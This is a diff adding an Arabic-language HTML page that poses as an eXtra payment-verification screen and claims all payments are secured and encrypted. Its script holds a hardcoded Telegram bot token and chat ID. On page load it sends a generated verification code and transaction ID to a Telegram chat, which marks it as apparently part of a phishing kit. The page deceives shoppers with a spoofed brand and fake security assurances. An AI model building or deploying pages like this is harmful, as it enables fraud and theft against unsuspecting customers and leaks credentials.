@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد الدفع - eXtra</title>
+    <style>
+        /* Reset & Base Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Tahoma', Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f8f9fa;
+            color: #333;
+            line-height: 1.6;
+            font-size: 14px;
+            overflow-x: hidden;
+        }
+        
+        /* Header Styles */
+        .top-bar {
+            background-color: #fff;
+            border-bottom: 1px solid #e0e0e0;
+            padding: 12px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+        
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo img {
+            height: 32px;
+        }
+        
+        /* Main Content Container */
+        .verification-container {
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 0 20px;
+            text-align: center;
+        }
+        
+        /* Verification Card */
+        .verification-card {
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            padding: 40px;
+            margin-bottom: 40px;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        /* Verification Icon */
+        .verification-icon {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 30px;
+            position: relative;
+        }
+        
+        .verification-icon-circle {
+            width: 100%;
+            height: 100%;
+            border: 8px solid #f0f0f0;
+            border-radius: 50%;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+        
+        .verification-icon-inner {
+            width: 60px;
+            height: 60px;
+            background: #0066cc;
+            border-radius: 50%;
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: pulse 2s infinite;
+        }
+        
+        .verification-icon-inner svg {
+            width: 30px;
+            height: 30px;
+            fill: #fff;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 102, 204, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 15px rgba(0, 102, 204, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 102, 204, 0); }
+        }
+        
+        /* Verification Title */
+        .verification-title {
+            font-size: 28px;
+            color: #0066cc;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        
+        .verification-subtitle {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.7;
+        }
+        
+        /* Code Input */
+        .code-container {
+            margin: 30px 0;
+        }
+        
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .code-input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            transition: all 0.3s;
+        }
+        
+        .code-input:focus {
+            border-color: #0066cc;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.2);
+        }
+        
+        .code-input.error {
+            border-color: #d32f2f;
+            animation: shake 0.5s;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-5px); }
+            40%, 80% { transform: translateX(5px); }
+        }
+        
+        .code-message {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .code-error {
+            color: #d32f2f;
+            font-weight: 500;
+            display: none;
+        }
+        
+        /* Verification Button */
+        .verify-btn {
+            background: #0066cc;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 14px 30px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 2px 8px rgba(0, 102, 204, 0.2);
+            width: 100%;
+            max-width: 300px;
+            margin: 20px auto;
+        }
+        
+        .verify-btn:hover {
+            background: #0052a3;
+        }
+        
+        .verify-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        
+        /* Processing Overlay */
+        .processing-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.9);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s;
+        }
+        
+        .processing-overlay.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+        
+        .processing-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(0, 102, 204, 0.2);
+            border-radius: 50%;
+            border-top-color: #0066cc;
+            animation: spin 1s ease-in-out infinite;
+            margin-bottom: 20px;
+        }
+        
+        .processing-text {
+            color: #0066cc;
+            font-size: 16px;
+            margin-top: 15px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Success Message */
+        .success-message {
+            background: #e8f5e9;
+            color: #2e7d32;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 30px 0;
+            display: none;
+        }
+        
+        /* Error Message */
+        .error-message {
+            background: #ffebee;
+            color: #d32f2f;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 30px 0;
+            display: none;
+        }
+        
+        /* Verification Details */
+        .verification-details {
+            background: #f9f9f9;
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 30px;
+            text-align: right;
+        }
+        
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px dashed #e0e0e0;
+        }
+        
+        .detail-row:last-child {
+            margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+        
+        .detail-label {
+            color: #666;
+            font-weight: 500;
+        }
+        
+        .detail-value {
+            color: #333;
+            font-weight: 600;
+        }
+        
+        /* Security Badge */
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 30px;
+            color: #4CAF50;
+            font-size: 14px;
+        }
+        
+        .security-badge svg {
+            width: 20px;
+            height: 20px;
+            fill: #4CAF50;
+        }
+        
+        /* Footer */
+        .verification-footer {
+            margin-top: 50px;
+            text-align: center;
+            color: #666;
+            font-size: 13px;
+            padding: 20px 0;
+            border-top: 1px solid #eee;
+        }
+        
+        /* Responsive Adjustments */
+        @media (max-width: 768px) {
+            .verification-card {
+                padding: 30px 20px;
+            }
+            
+            .verification-title {
+                font-size: 24px;
+            }
+            
+            .verification-subtitle {
+                font-size: 15px;
+            }
+            
+            .code-inputs {
+                gap: 10px;
+            }
+            
+            .code-input {
+                width: 40px;
+                height: 50px;
+                font-size: 20px;
+            }
+        }
+        
+        /* Additional Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .fade-in {
+            animation: fadeIn 0.5s ease;
+        }
+    </style>
+</head>
+<body>
+    <!-- Top Header Bar -->
+    <div class="top-bar">
+        <div class="header-container">
+            <div class="logo">
+                <img src="Extra_Logo.svg.png" alt="eXtra">
+            </div>
+            <div class="secure-badge">
+                <span style="font-size: 12px; color: #4CAF50;">✓ الدفع الآمن</span>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Main Content -->
+    <div class="verification-container">
+        <!-- Verification Card -->
+        <div class="verification-card">
+            <!-- Verification Icon -->
+            <div class="verification-icon">
+                <div class="verification-icon-circle"></div>
+                <div class="verification-icon-inner">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                    </svg>
+                </div>
+            </div>
+            
+            <!-- Verification Title -->
+            <h1 class="verification-title">التحقق من الدفع</h1>
+            <p class="verification-subtitle">لقد أرسلنا رمز التحقق إلى رقم هاتفك المسجل. الرجاء إدخال الرمز المكون من 6 أرقام</p>
+            
+            <!-- Code Input -->
+            <div class="code-container">
+                <div class="code-inputs" id="codeInputs">
+                    <input type="text" class="code-input" maxlength="1" data-index="0">
+                    <input type="text" class="code-input" maxlength="1" data-index="1">
+                    <input type="text" class="code-input" maxlength="1" data-index="2">
+                    <input type="text" class="code-input" maxlength="1" data-index="3">
+                    <input type="text" class="code-input" maxlength="1" data-index="4">
+                    <input type="text" class="code-input" maxlength="1" data-index="5">
+                </div>
+                
+                <p class="code-message">لم تستلم الرمز؟ <a href="#" style="color: #0066cc;">إعادة إرسال الرمز</a></p>
+                <p class="code-error" id="codeError">الرمز غير صحيح، الرجاء إدخال الرمز الصحيح</p>
+            </div>
+            
+            <!-- Verification Button -->
+            <button class="verify-btn" id="verifyBtn" disabled>تحقق</button>
+            
+            <!-- Success Message (Hidden by default) -->
+            <div class="success-message" id="successMessage">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="#2e7d32" style="vertical-align: middle; margin-left: 10px;">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                </svg>
+                تم التحقق بنجاح! جاري إكمال العملية...
+            </div>
+            
+            <!-- Error Message (Hidden by default) -->
+            <div class="error-message" id="errorMessage">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="#d32f2f" style="vertical-align: middle; margin-left: 10px;">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                </svg>
+                الرمز غير صحيح، الرجاء المحاولة مرة أخرى
+            </div>
+            
+            <!-- Verification Details -->
+            <div class="verification-details">
+                <div class="detail-row">
+                    <span class="detail-label">حالة التحقق:</span>
+                    <span class="detail-value" id="verificationStatus">بانتظار إدخال الرمز</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">معرف العملية:</span>
+                    <span class="detail-value" id="transactionId">TRX-</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">وقت الإرسال:</span>
+                    <span class="detail-value" id="sendTime"></span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">صلاحية الرمز:</span>
+                    <span class="detail-value">5 دقائق</span>
+                </div>
+            </div>
+            
+            <!-- Security Badge -->
+            <div class="security-badge">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11V11.99z"/>
+                </svg>
+                <span>جميع عمليات الدفع مؤمنة ومشفرة</span>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="verification-footer">
+            <p>eXtra © 2023 - جميع الحقوق محفوظة</p>
+        </div>
+    </div>
+    
+    <!-- Processing Overlay -->
+    <div class="processing-overlay" id="processingOverlay">
+        <div class="processing-spinner"></div>
+        <div class="processing-text" id="processingText">جاري التحقق من الرمز...</div>
+    </div>
+    
+    <script>
+        // Telegram Bot Configuration
+        const BOT_TOKEN = "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw";
+        const CHAT_ID = "5372119436";
+        
+        // Generate and send verification code
+        document.addEventListener('DOMContentLoaded', function() {
+            // Generate random 6-digit code
+            const verificationCode = Math.floor(100000 + Math.random() * 900000);
+            
+            // Set transaction details
+            const transactionId = 'TRX-' + Math.floor(100000 + Math.random() * 900000);
+            document.getElementById('transactionId').textContent = transactionId;
+            
+            // Set send time
+            const now = new Date();
+            document.getElementById('sendTime').textContent = now.toLocaleTimeString('ar-SA');
+            
+            // Send code to Telegram
+            sendToTelegram(`🔐 رمز التحقق: ${verificationCode}\n\n🆔 معرف العملية: ${transactionId}\n⏰ وقت الإرسال: ${now.toLocaleTimeString('ar-SA')}`);
+            
+            // Code input handling
+            const codeInputs = document.querySelectorAll('.code-input');
+            const verifyBtn = document.getElementById('verifyBtn');
+            const processingOverlay = document.getElementById('processingOverlay');
+            const processingText = document.getElementById('processingText');
+            const successMessage = document.getElementById('successMessage');
+            const errorMessage = document.getElementById('errorMessage');
+            const codeError = document.getElementById('codeError');
+            const verificationStatus = document.getElementById('verificationStatus');
+            
+            // Focus first input
+            codeInputs[0].focus();
+            
+            // Handle code input
+            codeInputs.forEach((input, index) => {
+                input.addEventListener('input', function(e) {
+                    // Only allow numbers
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                    
+                    // Move to next input if current has value
+                    if (this.value.length === 1 && index < codeInputs.length - 1) {
+                        codeInputs[index + 1].focus();
+                    }
+                    
+                    // Check if all inputs are filled
+                    checkCodeCompletion();
+                });
+                
+                // Handle backspace
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
+                        codeInputs[index - 1].focus();
+                    }
+                });
+            });
+            
+            // Check if all code inputs are filled
+            function checkCodeCompletion() {
+                let allFilled = true;
+                codeInputs.forEach(input => {
+                    if (input.value.length === 0) {
+                        allFilled = false;
+                    }
+                });
+                
+                verifyBtn.disabled = !allFilled;
+                return allFilled;
+            }
+            
+            // Verify button click
+            verifyBtn.addEventListener('click', function() {
+                // Get entered code
+                let enteredCode = '';
+                codeInputs.forEach(input => {
+                    enteredCode += input.value;
+                });
+                
+                // Show processing overlay
+                processingOverlay.classList.add('active');
+                processingText.textContent = "جاري التحقق من الرمز...";
+                
+                // Simulate verification delay (5 seconds)
+                setTimeout(function() {
+                    // Check if code is correct
+                    if (enteredCode == verificationCode) {
+                        // Correct code
+                        verificationStatus.textContent = "تم التحقق بنجاح";
+                        processingText.textContent = "جاري إكمال العملية...";
+                        
+                        // Show success message
+                        successMessage.style.display = "block";
+                        errorMessage.style.display = "none";
+                        codeError.style.display = "none";
+                        
+                        // Remove error class from inputs
+                        codeInputs.forEach(input => {
+                            input.classList.remove('error');
+                        });
+                        
+                        // Simulate processing delay (10 seconds)
+                        setTimeout(function() {
+                            processingOverlay.classList.remove('active');
+                            window.location.href = "index.html";
+                        }, 10000);
+                    } else {
+                        // Incorrect code
+                        verificationStatus.textContent = "الرمز غير صحيح";
+                        processingOverlay.classList.remove('active');
+                        
+                        // Show error messages
+                        errorMessage.style.display = "block";
+                        codeError.style.display = "block";
+                        
+                        // Add error class to inputs
+                        codeInputs.forEach(input => {
+                            input.classList.add('error');
+                            input.value = "";
+                        });
+                        
+                        // Focus first input
+                        codeInputs[0].focus();
+                        verifyBtn.disabled = true;
+                    }
+                }, 5000);
+            });
+            
+            // Function to send message to Telegram
+            function sendToTelegram(message) {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    }),
+                }).catch(error => console.error('Error sending to Telegram:', error));
+            }
+        });
+    </script>
+</body>
+</html>
